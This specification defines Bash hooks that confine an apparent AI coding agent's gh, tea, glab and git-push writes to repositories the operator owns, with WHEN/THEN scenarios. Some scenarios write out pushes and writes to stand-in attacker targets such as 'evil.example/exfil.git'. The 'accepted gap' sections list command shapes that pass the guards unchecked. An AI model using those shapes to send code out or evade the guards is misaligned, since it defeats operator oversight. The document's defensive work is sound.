# repo-ownership Specification

## Purpose
Repo ownership is the set of Bash hooks that keep `gh` and forge writes on repositories the operator owns, nudge on a push to a remote the operator does not own, refuse repository deletion, and advise when a repo is created or published: `cadence-hooks guardrails guard-push-remote`, `cadence-hooks guardrails guard-gh-write`, `cadence-hooks guardrails guard-forge-write`, `cadence-hooks guardrails guard-gh-dangerous`, `cadence-hooks guardrails inject-gh-write-context`, `cadence-hooks guardrails guard-git-init` and `cadence-hooks guardrails warn-going-public`.

## Requirements

### Requirement: Owner allowlist
The ownership guards SHALL read the operator's owners from `CADENCE_ALLOWED_OWNERS` and `owner/repo` pairs from `CADENCE_ALLOWED_REPOS` in the hook process environment, each a space- or comma-separated list matched case-insensitively. A bare entry MUST match only the default host (`GH_HOST`, else `github.com`) and hosts in `CADENCE_EXTRA_HOSTS`. A host-qualified entry (`host/owner`) MUST match only its own host. An inline prefix on the command MUST NOT change a verdict.

#### Scenario: Bare entry on the default host
- **WHEN** `CADENCE_ALLOWED_OWNERS=cameronsjo` and a push targets `https://github.com/CameronSjo/tool.git`
- **THEN** the target counts as owned

#### Scenario: Bare entry on a self-hosted forge
- **WHEN** `CADENCE_ALLOWED_OWNERS=cameron`, `CADENCE_EXTRA_HOSTS` is unset, and a push targets `https://git.example.com/cameron/tool.git`
- **THEN** the push nudges, and the nudge suggests qualifying the entry as `git.example.com/<owner>` or setting `CADENCE_EXTRA_HOSTS=git.example.com`

#### Scenario: Repo entry
- **WHEN** `CADENCE_ALLOWED_REPOS=external/shared-repo` and a write targets `external/shared-repo`
- **THEN** the target counts as owned while every other `external/*` repo does not

### Requirement: Push to a repository the operator does not own
`guard-push-remote` (PreToolUse, Bash) MUST NOT block. It SHALL nudge (exit 0, `Push target is not on your allowlist`) on a `git push` whose remote it read exactly (a URL, a named remote's push URL, or a bare push's tracking remote, in the directory the push walk followed) and whose owner is outside the allowlist, naming the remote and saying to confirm it or push to the fork. A push to owned remotes, and a command with no push, SHALL be allowed with no output.

#### Scenario: Ordinary push to an owned remote
- **WHEN** `git push origin feat/x` runs in a checkout whose `origin` is an owned GitHub repo
- **THEN** the hook exits 0 with no output

#### Scenario: Push to an unowned URL
- **WHEN** the command is `git push https://github.com/someone-else/repo.git main`
- **THEN** the hook exits 0 with a nudge that names the URL, the directory and the allowed entries, and says to confirm the remote or push to the fork

#### Scenario: Push text that is not a push
- **WHEN** the command is `git commit -m "remember to git push https://github.com/x/y.git"`
- **THEN** the hook allows with no output

#### Scenario: Chained pushes to owned remotes
- **WHEN** the command is `git push origin main && git push backup main` and both remotes are owned
- **THEN** the hook allows, each push judged on its own target

### Requirement: Push guard configuration and probe failures
`guard-push-remote` SHALL allow with no output when `CADENCE_ALLOWED_OWNERS` is empty, when the push runs in a directory that is not a git repository, and when a git probe exceeds the git-probe deadline (`CADENCE_HOOK_DEADLINE_MS`). It SHALL resolve at most four distinct directory and remote pairs per command and SHALL NOT judge the pushes past them.

#### Scenario: Unconfigured machine
- **WHEN** `CADENCE_ALLOWED_OWNERS` is unset and the command is `git push origin main`
- **THEN** the hook exits 0 with no output

#### Scenario: Not a repository
- **WHEN** an owner list is set and `git push origin main` runs in a directory with no git repository
- **THEN** the hook allows

#### Scenario: Probe timeout
- **WHEN** every git probe outlives the deadline and the command is `for x in 1; do git push r1 main; git push evilremote main; done`
- **THEN** the hook exits 0 with no output

### Requirement: gh write to a repository the operator does not own
`guard-gh-write` (PreToolUse, Bash) SHALL block (exit 2, `gh write targets repo you don't own`) a `gh` write on a repository outside the allowlist, judging each segment of a chain on its own target. The target SHALL be read from a PR or issue URL argument, `-R`/`--repo`, a `GH_REPO` assignment, a `gh repo` verb's positional `owner/repo`, a `gh api repos/<owner>/<repo>/...` path, and otherwise the git remotes of the directory the segment runs in. Reads SHALL be allowed whatever the target.

#### Scenario: Ordinary write with an owned target
- **WHEN** the command is `gh pr create -R cameronsjo/tool --title t --body-file b.md` and `cameronsjo` is allowed
- **THEN** the hook allows

#### Scenario: Unowned write after an owned one
- **WHEN** the command is `gh issue comment 1 -R cameronsjo/tool --body ok && gh issue comment 2 -R evil/repo --body x`
- **THEN** the hook exits 2 naming `evil/repo` and the allowed entries

#### Scenario: Read on an unowned repo
- **WHEN** the command is `gh pr view 5 -R someone/else` or `gh repo clone someone/else`
- **THEN** the hook allows

#### Scenario: Repo created from an owned template
- **WHEN** the command is `gh repo create --template cameronsjo/tpl work-org/x --private`
- **THEN** the hook exits 2 naming `work-org/x`, because under `gh repo create` `--template` and `-p` take the template as their value and the argument is the new repository

### Requirement: What counts as a gh write
`guard-gh-write` SHALL treat as writes: `gh pr|issue|release|label|repo|gist|workflow` with a mutating verb (`create`, `merge`, `close`, `comment`, `edit`, `delete`, `review`, `ready`, `reopen`, `lock`, `archive`, `rename`, `transfer`, `fork`, `run`, `enable`, `disable`), `gh secret|variable set|delete`, `gh release upload`, `gh label clone`, the deploy-key and autolink writes, and `gh api` with a mutating `-X`/`--method`, a field flag or `--input`, unless an explicit `GET` method is given.

#### Scenario: API field write
- **WHEN** the command is `gh api repos/evil/repo/issues -f title=x`
- **THEN** the hook exits 2

#### Scenario: Explicit GET with fields
- **WHEN** the command is `gh api repos/evil/repo/issues -X GET -f state=open`
- **THEN** the hook allows

### Requirement: gh writes the guard cannot place
`guard-gh-write` MUST allow a write whose target it cannot read exactly (cadence-ecosystem ADR-0046 rule 3): no readable `-R` or remote, `-R` readings that disagree, a target or host holding a shell expansion with no literal owner, a directory it cannot follow, a `gh api` write outside `repos/<owner>/<repo>/…` and `orgs/<org>/…`, and a command too large or nested to read. With no allowlist configured, a write MUST still block.

#### Scenario: Substituted owner with a literal name
- **WHEN** the command is `gh issue close 1 -R "$(cat o)/x"`
- **THEN** the hook allows, because the substitution is an expansion in the owner

#### Scenario: Write with no resolvable target
- **WHEN** `gh issue create --title t` runs in a directory with no git remote
- **THEN** the hook allows

#### Scenario: Variable target
- **WHEN** the command is `gh issue comment 1 -R "$REPO" --body-file c.md`
- **THEN** the hook allows

#### Scenario: Unexpanded host
- **WHEN** the command is `GH_HOST=$GH_HOST gh pr edit 7 --repo cameronsjo/tool --body-file b.md`
- **THEN** the hook allows

#### Scenario: Literal owner with an expanded name
- **WHEN** the command is `gh issue create -R "evil/$r" --title t`
- **THEN** the hook exits 2 naming the owner `evil`

#### Scenario: GraphQL read and thread resolution
- **WHEN** the command is `gh api graphql -f query='query { viewer { login } }'` or a `resolveReviewThread` mutation
- **THEN** the hook allows

#### Scenario: GraphQL mutation
- **WHEN** the command is `gh api graphql -f query='mutation { addComment(input: {subjectId: "S", body: "x"}) { clientMutationId } }'`
- **THEN** the hook allows

#### Scenario: Absolute API URL
- **WHEN** the command is `gh api -X POST https://api.github.com/repos/evil/x/issues/1/comments -f body=hi`
- **THEN** the hook exits 2 naming `evil/x`, as for the relative `repos/evil/x/…` path

#### Scenario: Org-level API write
- **WHEN** the command is `gh api -X POST orgs/evil/repos -f name=x`
- **THEN** the hook exits 2 naming the owner `evil`

#### Scenario: Placeholder owner
- **WHEN** the command is `gh api -X POST repos/{owner}/{repo}/issues -f title=x` or `repos/:owner/:repo/issues` in a checkout of `cameronsjo/tool`
- **THEN** the hook allows, because gh fills the placeholders from that checkout

#### Scenario: Placeholder owner on a named host
- **WHEN** the command is `gh api --hostname evil.example -X POST repos/{owner}/{repo}/issues -f title=x` in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2, because gh sends it to `evil.example`, which the allowlist does not cover

#### Scenario: Placeholder owner with a literal name
- **WHEN** the command is `gh api -X POST 'repos/{owner}/other/issues' -f title=x` in a fork checkout with origin `work-org/x` and upstream `work-org/y`, `CADENCE_ALLOWED_OWNERS=cameronsjo` and `CADENCE_ALLOWED_REPOS=work-org/x,work-org/y`; or the same command as `GH_REPO=work-org/template gh api …` in a checkout of `cameronsjo/tool` with `CADENCE_ALLOWED_REPOS=work-org/template`
- **THEN** the hook exits 2, because gh fills the owner from the base repository and keeps the literal name, so it writes to `work-org/other`, which neither allowlist covers

#### Scenario: Placeholder org
- **WHEN** the command is `GH_REPO=evil/x gh api -X POST 'orgs/{owner}/repos' -f name=x` (or with `GH_REPO` exported or inherited), or `gh api -X POST 'orgs/{owner}/repos' -f name=x` with no `GH_REPO` in a fork checkout whose upstream owner is `work-org`, with `CADENCE_ALLOWED_OWNERS=cameronsjo`
- **THEN** the hook exits 2 naming the org gh fills in (`evil`, or `work-org`), and the same write allows when that owner is `cameronsjo` or the checkout is `cameronsjo/tool` with no `GH_REPO`

#### Scenario: Upload and GHE.com URL prefixes
- **WHEN** the command is `gh api -X POST "https://uploads.github.com/repos/evil/x/releases/1/assets?name=a" --input a`, or `https://api.acme.ghe.com/repos/evil/x/…` with `acme.ghe.com` in `CADENCE_EXTRA_HOSTS`
- **THEN** the hook exits 2 naming `evil/x`

#### Scenario: Look-alike API host
- **WHEN** the command is `gh api -X POST https://api.github.com.evil.example/repos/evil/x/issues -f t=x`
- **THEN** the hook allows, because the host is compared whole and names no repo this guard reads

#### Scenario: Unconfigured machine
- **WHEN** `CADENCE_ALLOWED_OWNERS` is unset and the command is `gh pr merge 5 -R cameronsjo/tool`
- **THEN** the hook exits 2 with `Not configured`

### Requirement: Untargeted gh write context
`inject-gh-write-context` (PreToolUse, Bash) SHALL nudge on every `gh` write segment that names no target (no `-R`, no `repos/owner/repo` or `orgs/<org>` path, no positional repo), restating that writes are allowlist-policed, that `-R owner/repo` should always be passed, and the allowed owners or that none are configured. It MUST repeat on every such write, MUST NOT block, and SHALL stay silent on reads and on writes that name their target.

#### Scenario: Bare write
- **WHEN** the command is `gh pr create --title t --body-file b.md`
- **THEN** the hook exits 0 with context naming `-R owner/repo` and the allowed owners

#### Scenario: Targeted write
- **WHEN** the command is `gh pr create -R cameronsjo/tool --title t --body-file b.md` with no bare `#N` in the body
- **THEN** the hook exits 0 with no output

### Requirement: Bare issue reference in a retargeted body
`inject-gh-write-context` SHALL nudge when `gh issue create|edit|comment` or `gh pr create|edit|comment|review` posts with `-R other/repo` a body holding a bare `#N` and `other/repo` is not the `origin` of the checkout the command runs in, advising `owner/repo#N`. It SHALL stay silent when no origin can be read.

#### Scenario: Cross-repo body
- **WHEN** the checkout's origin is `cameronsjo/cadence` and the command is `gh issue comment 4 -R cameronsjo/forgectl --body "see #12"`
- **THEN** the hook exits 0 with a nudge that a bare `#12` resolves against `cameronsjo/forgectl`

### Requirement: tea and glab writes
`guard-forge-write` (PreToolUse, Bash) SHALL block (exit 2) a `tea` or `glab` write whose target is outside the allowlist or cannot be read, and SHALL allow reads and any verb outside its write table. For `glab` the target is `-R`/`--repo`; a bare target MUST match a bare entry only on a host in `CADENCE_EXTRA_HOSTS` or a `gitlab.com/<owner>` entry, never on the GitHub default host. With no allowlist every write it reaches MUST block. `glab api` and `tea api` SHALL be allowed.

#### Scenario: Unowned GitLab write
- **WHEN** the command is `glab mr create -R evil/r --title t`
- **THEN** the hook exits 2 naming `glab write targets` and the allowed entries

#### Scenario: GitLab read
- **WHEN** the command is `glab mr list -R evil/r`
- **THEN** the hook allows

### Requirement: tea targets read as tea reads them
For `tea` the target SHALL be `--repo`/`-r` (`-R` is tea's `--remote`), its first two `/` parts being owner and repo. A bare slug MUST be owned on every tea login host (the `--login` one, else every saved login, plus a `GITEA_INSTANCE_URL` host). Only when tea's config is missing, empty, comment-only or `logins: []` does `CADENCE_EXTRA_HOSTS` decide.

#### Scenario: Bare tea slug on the login host
- **WHEN** tea's only login is `https://git.sjo.lol`, `git.sjo.lol/cameron` is allowed, and the command is `tea pr create --repo cameron/lectern`
- **THEN** the hook allows

#### Scenario: Single-dash login flag
- **WHEN** the checkout's remote is owned and the command is `tea pr create --title t -login work`, where `work` is a login on an unowned host
- **THEN** the hook exits 2

#### Scenario: Host-qualified tea slug
- **WHEN** the command is `tea pr create --repo git.sjo.lol/cameron/lectern`
- **THEN** the hook exits 2 naming `tea write targets git.sjo.lol/cameron`, since tea reads owner `git.sjo.lol`

### Requirement: tea flags read as tea's parser reads them
tea's flags SHALL be read as tea's parser (urfave/cli v3) reads them: one or two dashes, a name or alias, `=` or the next word, and none after `--`, a lone `-`, or `-` plus a byte that is not an ASCII letter. The value flags SHALL be the ones tea 0.16 defines for the judged writes.

#### Scenario: Comment body that ends tea's flags
- **WHEN** the checkout's remote is unowned and the command is `tea comment 5 "- fixed" --repo cameron/x`
- **THEN** the hook exits 2, since tea reads `--repo cameron/x` as comment text and writes to the checkout's repo

### Requirement: tea writes judged on their directory
A `tea` `pulls`, `issues` or `comment` write with no `--repo` or `--owner` SHALL be judged on the git remotes of the directory it runs in (payload `cwd`, literal `cd`s, `env -C`); every remote, or the `--remote` one, MUST be owned, and on the login host when `--login` or `GITEA_INSTANCE_URL` moves it. No readable two-part remote MUST block as unreadable.

#### Scenario: tea write in an owned checkout
- **WHEN** the command is `cd <repo> && tea pr create --title t` and every remote of `<repo>` is an owned repo
- **THEN** the hook allows

#### Scenario: Login on another host
- **WHEN** the checkout's remote is owned on `git.sjo.lol` and the command is `tea pr create --title t --login work`, where `work` is a login on an unowned host
- **THEN** the hook exits 2

### Requirement: tea targets the guard cannot read
`guard-forge-write` MUST block as unreadable a `tea` write whose `--repo`/`--owner` is not a literal `owner/repo`, whose `--repo` names an existing directory, that is `repos create|delete` without `--owner`, that carries a near miss of a repo, login, remote or owner flag (`--rep`, `-logi`) or an unknown flag followed by a `-` word, or that sets a `GITEA_*` variable tea reads in front of `tea`. Each is a shape where tea's write target can differ from what the guard read.

#### Scenario: Repo from a variable
- **WHEN** the command is `tea pr create --repo "$REPO"` in an owned checkout
- **THEN** the hook exits 2 with rule `forge-write-target-unresolvable`

### Requirement: tea environment the guard cannot read
`guard-forge-write` MUST block as unreadable a `tea` write when anywhere in the command an assignment, `export` or `unset` touches `GITEA_INSTANCE_URL`, `HOME` or `XDG_CONFIG_HOME`, or `env -i`/`env -u` runs. Each can move the config or login tea uses away from the one the guard reads.

#### Scenario: Config home exported earlier in the command
- **WHEN** the command is `export XDG_CONFIG_HOME=/x; tea pr create --repo cameron/lectern`
- **THEN** the hook exits 2 with rule `forge-write-target-unresolvable`

### Requirement: tea login config the guard cannot read
A `tea` write judged on a login host MUST block when tea's config has a login the guard cannot read (an entry without a plain `name:` and `url:`, a list at the key's column, an inline list, a file over 1 MiB, or content yielding no login), or a literal `--login` names no saved login. It MUST NOT fall back to `CADENCE_EXTRA_HOSTS`; only a missing, empty, comment-only or `logins: []` config does.

#### Scenario: One unreadable login with extra hosts set
- **WHEN** `CADENCE_EXTRA_HOSTS` names the owned host and tea's config has a readable `sjo` login and a `work` login written with a quoted `"url":` key
- **THEN** `tea pr create --repo cameron/lectern` exits 2

### Requirement: Repository deletion
`guard-gh-dangerous` (PreToolUse, Bash) SHALL block (exit 2, `gh repo delete is blocked`) `gh repo delete` and `gh api -X DELETE repos/<owner>/<repo>` on any repository, owned or not, including inside shell wrappers, a literal piped into a shell, and quoted or brace-built spellings the shell runs as a delete. It SHALL block a `gh` command too large to read when its text could spell a delete. Other `gh` commands, and the phrase in quoted prose, SHALL be allowed.

#### Scenario: Owned repo deletion
- **WHEN** the command is `gh repo delete cameronsjo/tool --yes` and `cameronsjo` is allowed
- **THEN** the hook exits 2 with a fix to delete manually on github.com

#### Scenario: Ordinary gh command
- **WHEN** the command is `gh repo view cameronsjo/tool`
- **THEN** the hook allows

#### Scenario: API delete of a sub-resource
- **WHEN** the command is `gh api -X DELETE repos/cameronsjo/tool/labels/bug`
- **THEN** `guard-gh-dangerous` allows

### Requirement: Protected ownership guards
`CADENCE_DISABLE` MUST NOT switch off `guard-gh-write` or `guard-gh-dangerous`: the name is reported as refused and the guard still runs. `CADENCE_BYPASS=1` SHALL switch them off. `guard-push-remote`, `guard-forge-write`, `inject-gh-write-context`, `guard-git-init` and `warn-going-public` SHALL honour `CADENCE_DISABLE`. Every hook here SHALL run unchanged under `CLAUDE_CODE_REMOTE=true`.

#### Scenario: Disable refused
- **WHEN** `CADENCE_DISABLE=guard-gh-write` and the command writes to an unowned repo
- **THEN** the write still blocks

#### Scenario: Push nudge switched off
- **WHEN** `CADENCE_DISABLE=guard-push-remote` and `guardrails guard-push-remote` runs
- **THEN** it exits 0 without reading stdin

### Requirement: New repository reminder
`guard-git-init` (PostToolUse, Bash) SHALL nudge after `git init` or `gh repo create` to run `/a-star-is-born` and to confirm the license with the author before assuming one. A `git init` whose every created repository resolves under a temp root (`$TMPDIR`, `/tmp`, a `mktemp -d` path) SHALL be silent; `gh repo create` MUST nudge from any directory. It MUST NOT block and SHALL ignore the commands inside quoted prose.

#### Scenario: Real project
- **WHEN** `git init ~/Projects/new-tool` completes
- **THEN** the hook exits 0 with context naming `/a-star-is-born` and the license decision

#### Scenario: Test fixture
- **WHEN** `d=$(mktemp -d) && git init "$d"` completes
- **THEN** the hook exits 0 with no output

### Requirement: Going-public term scan
`warn-going-public` (PreToolUse, Bash) SHALL nudge, never block, when `gh repo create` (any visibility), `gh repo rename`, or `gh repo edit` with a public visibility carries a name or `--description` matching a compiled home-media term (the `*arr` family and similar), a `CADENCE_GOING_PUBLIC_TERMS` term, or a work term from `~/.config/cadence/redaction.toml`. Any parse problem SHALL allow.

#### Scenario: Sensitive name
- **WHEN** the command is `gh repo create sonarr-stack --public`
- **THEN** the hook exits 0 with a nudge naming `sonarr` and `CADENCE_GOING_PUBLIC_IGNORE`

#### Scenario: Neutral repository
- **WHEN** the command is `gh repo create cli-tools --public --description "small shell helpers"`
- **THEN** the hook exits 0 with no output

### Requirement: Going-public relief
`CADENCE_GOING_PUBLIC_IGNORE` SHALL relieve compiled and `CADENCE_GOING_PUBLIC_TERMS` terms and MUST NOT relieve a `redaction.toml` term, which only that file's own `allow` entries relieve. Both variables MUST be read from the session environment, not from an inline prefix on the command.

#### Scenario: Inline ignore prefix
- **WHEN** the command is `CADENCE_GOING_PUBLIC_IGNORE=sonarr gh repo create sonarr-stack` and the session environment does not set it
- **THEN** the hook still nudges


### Requirement: gh write named by a PR or issue URL argument
On a `gh pr` or `gh issue` write verb that takes a `<number> | <url> | <branch>` argument, `guard-gh-write` SHALL judge the repo and host a PR or issue URL there names before `-R`, `GH_REPO` and the checkout; under `gh issue transfer` the URL is judged in addition to them. A URL it cannot read for certain SHALL be judged as before. An unowned URL SHALL block with a fix that names no target. A flag's value SHALL NOT count.

#### Scenario: Unowned PR URL past an owned target
- **WHEN** the command is `gh pr merge https://github.com/evil/repo/pull/1 --squash -R cameronsjo/tool`, in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 naming `github.com/evil/repo`, and the fix asks the user to run the command and names no `cameronsjo/` repo

#### Scenario: Owned issue URL outside an owned checkout
- **WHEN** the command is `gh issue close https://github.com/cameronsjo/tool/issues/3`, in a checkout of `evil/repo` or in `/tmp`
- **THEN** the hook allows

#### Scenario: URL as a flag's value
- **WHEN** the command is `gh pr comment 5 --body https://github.com/evil/repo/pull/1`, in a checkout of `cameronsjo/tool`
- **THEN** the hook allows

#### Scenario: Owned issue URL in a transfer from an unowned checkout
- **WHEN** the command is `gh issue transfer https://github.com/cameronsjo/tool/issues/3 evil/repo`, in a checkout of `evil/repo`
- **THEN** the hook exits 2 naming `evil/repo`

#### Scenario: Owned PR URL in a loop from an unowned checkout
- **WHEN** the command is `for n in 1 2; do gh pr merge https://github.com/cameronsjo/tool/pull/$n; done`, in a checkout of `evil/repo`
- **THEN** the hook allows, judging each merge as a single command, where gh takes the URL's repo

#### Scenario: Percent sign in the query
- **WHEN** the command is `gh pr merge 'https://github.com/evil/repo/pull/1/files?file-filters%5B%5D=.rs'`, in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 naming `github.com/evil/repo`

#### Scenario: Percent sign in the path
- **WHEN** the command is `gh pr merge https://github.com/evil%2Drepo/x/pull/1`, in a checkout of `cameronsjo/tool`
- **THEN** the hook allows, judging the checkout as before

#### Scenario: Bad escape in the fragment
- **WHEN** the command is `gh pr merge 'https://github.com/evil/repo/pull/1#f%zz'`, in a checkout of `cameronsjo/tool`
- **THEN** the hook allows, judging the checkout as before

### Requirement: Push after an eval of text built at run time
`guard-push-remote` SHALL judge a push after an `eval` whose script is built at run time (`eval "$S"`, `eval "$(direnv export bash)"`) in the directory it read. When something it read may move the push (the `eval`'s words name `cd`, `pushd`, `popd` or `eval`, or hold a backslash, a variable the command names, or an unusual expansion; or the command defines a function, may replace a tool, or names a `GIT_` variable), and after a literal `eval`, it SHALL allow with no output.

#### Scenario: direnv line in an owned checkout
- **WHEN** the command is `eval "$(direnv export bash)"; git push origin feat` in a checkout whose `origin` is owned
- **THEN** the hook exits 0 with no output

#### Scenario: direnv line in an unowned checkout
- **WHEN** the command is `eval "$(direnv export bash)"; git push origin feat` in a checkout whose `origin` is not owned
- **THEN** the hook exits 0 with a `Push target is not on your allowlist` nudge

#### Scenario: A variable the command names
- **WHEN** the command is `S='cd /other'; eval "$S"; git push origin feat` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: A literal eval
- **WHEN** the command is `eval 'echo hi'; git push origin feat` in an unowned checkout
- **THEN** the hook exits 0 with no output

### Requirement: User-scoped gh writes
`guard-gh-write` SHALL allow `gh gist` writes and `gh repo fork` (they land under the operator's account) and `gh issue create --web`/`-w` unless the command sets `BROWSER=` or `GH_BROWSER=`. An ownership probe past the git-probe deadline MUST allow.

#### Scenario: Gist from an unowned checkout
- **WHEN** `gh gist create notes.md` runs in a checkout whose remote is unowned
- **THEN** the hook allows

### Requirement: gh writes in a loop
`guard-gh-write` SHALL judge each gh write in a loop body as a single command, in the directory the guard reads it to run in. A literal unowned target SHALL block; a write without a target SHALL be judged on its directory's remotes; a target the shell builds per iteration (`-R "$r"`) MUST be allowed.

#### Scenario: Loop with a literal unowned target
- **WHEN** the command is `for i in 1 2; do gh issue close $i -R evil/x; done`
- **THEN** the hook exits 2 naming `evil/x`

#### Scenario: Loop in an unowned checkout
- **WHEN** the command is `for n in 1 2; do gh issue close $n; done` in a checkout whose remote is unowned
- **THEN** the hook exits 2

#### Scenario: Loop in an owned checkout
- **WHEN** the command is `for n in 1 2; do gh issue close $n; done` in a checkout of `cameronsjo/tool`
- **THEN** the hook allows

#### Scenario: Loop over a variable target
- **WHEN** the command is `for r in a b; do gh issue close 1 -R "$o/$r"; done`
- **THEN** the hook allows

### Requirement: Deploy-key and autolink writes
`guard-gh-write` SHALL treat `gh repo deploy-key add|delete` and `gh repo autolink create|new|delete` as writes, judged on the same targets as every other `-R` write (`-R`, else `GH_REPO` and the checkout's remotes). Their `list` and `view` verbs SHALL be reads.

#### Scenario: Deploy key on an unowned repo
- **WHEN** the command is `gh repo deploy-key add key.pub -R evil/x`
- **THEN** the hook exits 2 naming `evil/x`

#### Scenario: Autolink through an exported GH_REPO
- **WHEN** the command is `export GH_REPO=evil/x; gh repo autolink delete 1`, in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2

### Requirement: GH_REPO a gh write inherits
`guard-gh-write` SHALL read `GH_REPO` from an inline `GH_REPO=` on the gh word, and otherwise from the `GH_REPO` in force: the hook process's, replaced by each literal `export GH_REPO=` and cleared by each `unset GH_REPO` the command runs in its own shell before the write (bash's `unset -v` and `--` forms included). Any `GH_REPO` SHALL be judged only on a command gh reads it for: in the `gh repo` group only `rename`, `deploy-key` and `autolink`, and in `gh api` only to fill a placeholder.

#### Scenario: Command that never reads GH_REPO
- **WHEN** the command is `export GH_REPO=evil/x; gh repo create cameronsjo/new --private`
- **THEN** the hook allows, because `gh repo create` takes its repository from its argument

#### Scenario: Export in a child shell
- **WHEN** the command is `bash -c 'export GH_REPO=evil/x'; gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
- **THEN** the hook allows

#### Scenario: Exported GH_REPO
- **WHEN** the command is `export GH_REPO=evil/x; gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 naming `evil/x`

#### Scenario: Hook process GH_REPO
- **WHEN** the hook process has `GH_REPO=evil/x` and `gh issue comment 1 --body hi` runs in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2

### Requirement: GH_REPO spellings the guard does not read
`guard-gh-write` MUST NOT read a `GH_REPO` set any other way, as an accepted gap (cadence-ecosystem ADR-0046 rule 3): `GH_REPO=x; export GH_REPO`, `declare -x`, `typeset -x`, `readonly -x` (zsh), `export -p` (bash), `set -a`, and an `export` or `unset` inside a loop, `if`, brace group or other compound command. An `export` behind `&&` or `||` SHALL be read as if it ran.

#### Scenario: Unset in a brace group
- **WHEN** the command is `export GH_REPO=evil/x; { unset GH_REPO; }; gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2, an accepted false block: the `unset` is not read, so the export stays in force

#### Scenario: Assignment exported afterwards
- **WHEN** the command is `GH_REPO=evil/x; export GH_REPO; gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
- **THEN** the hook allows

#### Scenario: Conditional export
- **WHEN** the command is `false && export GH_REPO=evil/x; gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2, reading the export as if it ran

### Requirement: GH_HOST a gh write inherits
`guard-gh-write` SHALL judge a write on the host it names (`--hostname`, an inline `GH_HOST=`), else the hook process's `GH_HOST`. A `GH_HOST` the command sets other than inline on the gh word (an `export`, a bare reassignment of an inherited one, an `unset`) MUST NOT be read.

#### Scenario: Host the command exports
- **WHEN** the command is `export GH_HOST=evil.example.com && gh pr create -R cameronsjo/x --title t`
- **THEN** the hook allows, judging `cameronsjo/x` on the hook process's host

### Requirement: Home directory in a gh write's cd
`guard-gh-write` SHALL follow a `cd` or `pushd` to a leading `$HOME` or `${HOME}` that bash expands as it follows `cd ~/…`, unless the command may rebind `HOME`, and judge a write after it on that directory's remotes. An unquoted `$HOME` whose home path holds whitespace or a glob character MUST be left unread, as an accepted gap: that matches bash, which splits and globs it, and not zsh, which does neither and lands in the directory.

#### Scenario: Unquoted HOME with a space
- **WHEN** the home path holds a space, `~/up` is a checkout of `evil/up`, and the command is `cd $HOME/up; gh pr create --title t`, run from a checkout of `cameronsjo/tool`
- **THEN** the hook allows

#### Scenario: Home directory spelled with $HOME
- **WHEN** `~/up` is a checkout of `evil/up` and the command is `cd "$HOME/up" && gh pr create --title t`
- **THEN** the hook exits 2, as for `cd ~/up && gh pr create --title t`

#### Scenario: HOME rebound first
- **WHEN** the command is `HOME=/x; cd "$HOME/up" && gh pr create --title t`
- **THEN** the hook allows, because it cannot follow the directory

### Requirement: gh writes the guard does not judge
`guard-gh-write` MUST allow, as an accepted gap, the gh writes outside its write set, whatever their target: `gh repo unarchive`, `gh repo sync`, `gh pr revert`, `gh pr update-branch`, `gh issue pin`, `unpin` and `develop`, `gh run rerun`, `cancel` and `delete`, `gh cache delete`, and `gh discussion create`, `edit` and `comment`.

#### Scenario: Run rerun on an unowned repo
- **WHEN** the command is `gh run rerun 1 -R evil/x`
- **THEN** the hook allows

### Requirement: Pushes the push guard does not judge
`guard-push-remote` SHALL allow with no output a push whose remote it did not read exactly (cadence-ecosystem ADR-0046 rule 3): a target or directory the shell builds at run time, a redirected or wrapped push, a `-c` override, a bare push after a possible branch switch, a URL with no `owner/repo`, or a remote git cannot resolve.

#### Scenario: Variable remote
- **WHEN** the command is `git push "$REMOTE" main` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: Variable directory
- **WHEN** the command is `cd "$REPO" && git push origin main` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: Rewritten push URL
- **WHEN** the command is `git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main`
- **THEN** the hook exits 0 with no output

#### Scenario: Bare push after a branch switch
- **WHEN** the command is `git checkout other && git push` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: URL with no owner
- **WHEN** the command is `git push https://evil.example/exfil.git main`
- **THEN** the hook exits 0 with no output
